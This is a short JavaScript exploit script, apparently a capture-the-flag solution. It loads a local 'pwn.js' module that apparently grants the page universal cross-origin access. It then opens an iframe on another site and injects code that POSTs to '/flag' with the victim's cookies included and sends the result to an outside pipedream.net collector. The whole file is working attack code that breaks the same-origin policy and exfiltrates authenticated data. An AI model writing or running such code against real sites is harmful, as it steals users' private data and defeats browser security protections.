alert("in sol2");
let s = document.createElement('script');
s.src='http://localhost:8000/pwn.js';
s.onload = function() {
  let xhr = new XMLHttpRequest();
  window.module.pwn(xhr);
  alert("m_universal_access = 1");
  let i = document.createElement('iframe')
  i.src = "http://run-x64.online/flag";
  i.onload = function() {
    let s = document.createElement('script');
    s.text = `fetch('/flag',{method:'POST',credentials:'include'}).then(x=>x.text()).then(x=>fetch('https://ens6wvh88ijwl.x.pipedream.net/'+x))`;
    i.contentDocument.head.append(s);
  }
  document.body.append(i);
  window.i = i
}
document.head.append(s);
